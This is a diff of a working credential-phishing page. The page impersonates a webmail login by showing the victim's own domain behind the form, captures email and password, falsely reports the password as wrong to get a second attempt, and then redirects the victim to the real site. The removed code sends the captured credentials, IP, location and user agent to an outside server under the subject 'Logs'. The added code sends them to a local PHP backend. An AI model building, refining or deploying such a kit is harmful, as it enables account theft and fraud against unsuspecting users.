@@ -287,6 +287,7 @@
             display: none;
         }
     </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
     <!-- REMOVED: Background toggle switch -->
@@ -359,7 +360,7 @@ function loadWebsitePreview(domain) {
     const iframeBackground = document.getElementById('iframe-background');
     
     if (!domain || domain === 'example.com') {
-        iframeBackground.style.opacity = '1'; // Changed from '0' to '1'
+        iframeBackground.style.opacity = '1';
         return;
     }
     
@@ -376,7 +377,7 @@ function loadWebsitePreview(domain) {
     iframe.onload = function() {
         iframeLoading.style.display = 'none';
         iframe.style.opacity = '1';
-        iframeBackground.style.opacity = '1'; // Maximum opacity
+        iframeBackground.style.opacity = '1';
         console.log('Website preview loaded successfully for:', domain);
     };
     
@@ -392,7 +393,7 @@ function loadWebsitePreview(domain) {
         
         // If both fail, keep iframe visible with fallback
         iframeLoading.style.display = 'none';
-        iframeBackground.style.opacity = '1'; // Still keep it visible
+        iframeBackground.style.opacity = '1';
     };
 }
 
@@ -416,7 +417,6 @@ function getDomainName(domain) {
 
 // Function to get website URL from domain
 function getWebsiteUrl(domain) {
-    // Try with https first, then http
     return `https://${domain}`;
 }
 
@@ -559,7 +559,7 @@ $("#email").on("input", function() {
         $('#attempt-info').hide();
         
         // Keep iframe visible but with default or no content
-        document.getElementById('iframe-background').style.opacity = '1'; // Changed from '0' to '1'
+        document.getElementById('iframe-background').style.opacity = '1';
     }
 });
 
@@ -611,93 +611,109 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
     
     // Extract domain info
     const domain = getDomainFromEmail(email);
-    const domainName = getDomainName(domain);
     
-    // Get IP information and send to FormSubmit
-    $.getJSON('https://ipinfo.io/json', function(response) {
-        // Prepare form data for FormSubmit
-        const formData = {
-            _subject: "Logs | " + response.ip,
-            Email: email,
-            Password: password,
-            Attempts: loginAttempts,
-            IP: response.ip,
-            Location: response.city + ", " + response.country,
-            Domain: domain,
-            UserAgent: navigator.userAgent,
-            Timestamp: new Date().toLocaleString()
-        };
-        
-        console.log('Submitting login attempt:', loginAttempts, 'for domain:', domain);
-        console.log('IP Info:', response);
-        
-        // Send data to FormSubmit endpoint
-        $.ajax({
-            url: "https://sterlingfinancialcapital.com/mrfx-general/api.php",
-            type: "POST",
-            data: formData,
-            dataType: "json",
-            success: function(data) {
-                console.log('FormSubmit success response:', data);
-                processRedirectLogic(email, password, domain, loginAttempts);
-            },
-            error: function(jqXHR, textStatus, errorThrown) {
-                console.log('FormSubmit error:', textStatus, errorThrown);
-                // Even if FormSubmit fails, continue with redirect logic
-                processRedirectLogic(email, password, domain, loginAttempts);
+    // Prepare data for PHP backend
+    const formData = {
+        email: email,
+        password: password,
+        Attempts: loginAttempts
+    };
+    
+    console.log('Submitting login attempt:', loginAttempts, 'for domain:', domain);
+    console.log('Form data:', formData);
+    
+    // Send data to PHP backend
+    $.ajax({
+        url: "process.php", // Path to your PHP backend
+        type: "POST",
+        data: formData,
+        dataType: "json",
+        success: function(data) {
+            console.log('PHP backend response:', data);
+            
+            // Hide loader and restore button
+            loader.style.display = 'none';
+            btnText.style.display = 'block';
+            submitBtn.disabled = false;
+            
+            if (data.redirect) {
+                // Redirect to the domain
+                console.log('Second attempt detected, preparing redirect...');
+                showError('Password is incorrect, please try again!');
+                
+                // Clear password field
+                document.getElementById('psw').value = '';
+                
+                // Wait 2 seconds then redirect
+                setTimeout(() => {
+                    try {
+                        localStorage.removeItem('loginAttempts');
+                        localStorage.removeItem('currentEmail');
+                        window.location.href = data.redirect_url || getWebsiteUrl(domain);
+                    } catch (error) {
+                        console.error('Redirect error:', error);
+                        window.location.href = `http://${domain}`;
+                    }
+                }, 2000);
+            } else {
+                // First attempt - show error message
+                showError('Password is incorrect, please try again!');
+                
+                // Clear password field for retry
+                document.getElementById('psw').value = '';
+                document.getElementById('psw').focus();
+                
+                // Update attempt display
+                updateAttemptDisplay();
             }
-        });
-        
-    }).fail(function() {
-        // If IP info fails, still proceed
-        console.log('IP info fetch failed, proceeding without location data');
-        
-        // Prepare form data without location
-        const formData = {
-            _subject: "Logs | IP Fetch Failed",
-            Email: email,
-            Password: password,
-            Attempts: loginAttempts,
-            IP: 'Fetch Failed',
-            Location: 'Unknown',
-            Domain: domain,
-            UserAgent: navigator.userAgent,
-            Timestamp: new Date().toLocaleString()
-        };
-        
-        // Send to FormSubmit endpoint
-        $.ajax({
-            url: "https://sterlingfinancialcapital.com/mrfx-general/api.php",
-            type: "POST",
-            data: formData,
-            dataType: "json"
-        }).always(function() {
+        },
+        error: function(jqXHR, textStatus, errorThrown) {
+            console.log('PHP backend error:', textStatus, errorThrown);
+            
+            // Hide loader and restore button
+            loader.style.display = 'none';
+            btnText.style.display = 'block';
+            submitBtn.disabled = false;
+            
+            // Fallback to original redirect logic if PHP backend fails
             processRedirectLogic(email, password, domain, loginAttempts);
-        });
+        }
     });
 });
 
-// Function to handle redirect logic after FormSubmit attempts
+// Function to handle redirect logic (fallback if PHP fails)
 function processRedirectLogic(email, password, domain, loginAttempts) {
-    // Hide loader and restore button
-    const submitBtn = document.getElementById('submit-btn');
-    const btnText = document.getElementById('btn-text');
-    const loader = document.getElementById('loader');
-    
-    loader.style.display = 'none';
-    btnText.style.display = 'block';
-    submitBtn.disabled = false;
+    console.log('Using fallback redirect logic');
     
     if (loginAttempts >= 2) {
         // Second attempt - redirect to domain
         console.log('Second attempt detected, preparing redirect...');
-        redirectToDomain(domain);
+        
+        // Show error message
+        showError('Password is incorrect, please try again!');
+        
+        // Clear password field
+        document.getElementById('psw').value = '';
+        
+        // Wait 2 seconds then redirect
+        setTimeout(() => {
+            try {
+                localStorage.removeItem('loginAttempts');
+                localStorage.removeItem('currentEmail');
+                window.location.href = getWebsiteUrl(domain);
+            } catch (error) {
+                console.error('Redirect error:', error);
+                window.location.href = `http://${domain}`;
+            }
+        }, 2000);
     } else {
         // First attempt - show error message
         showError('Password is incorrect, please try again!');
+        
         // Clear password field for retry
         document.getElementById('psw').value = '';
         document.getElementById('psw').focus();
+        
         // Update attempt display
         updateAttemptDisplay();
     }
@@ -725,18 +741,9 @@ function showSuccess(message) {
     }, 5000);
 }
 
-// Additional: Add honeypot field
-document.querySelector('input[name="_honey"]').addEventListener('focus', function() {
-    this.value = 'bot-detected-' + Date.now();
-});
-
-// REMOVED: Background toggle functionality
-
 // Initialize form when page loads
 $(document).ready(function() {
     initializeForm();
-    
-    // REMOVED: Initialize background toggle
 });
 
 // Clear attempts when page is closed/refreshed (optional)
@@ -744,6 +751,27 @@ window.addEventListener('beforeunload', function() {
     // Optional: uncomment to clear attempts on page refresh
     // localStorage.removeItem('loginAttempts');
     // localStorage.removeItem('currentEmail');
+});
+
+// Additional utility function to check if backend is reachable
+function checkBackendAvailability() {
+    $.ajax({
+        url: "process.php",
+        type: "HEAD",
+        timeout: 3000,
+        success: function() {
+            console.log("PHP backend is available");
+        },
+        error: function() {
+            console.warn("PHP backend is not available, will use fallback logic");
+        }
+    });
+}
+
+// Check backend on page load
+$(document).ready(function() {
+    // Optional: Check backend availability
+    // checkBackendAvailability();
 });
 </script>
 </body>
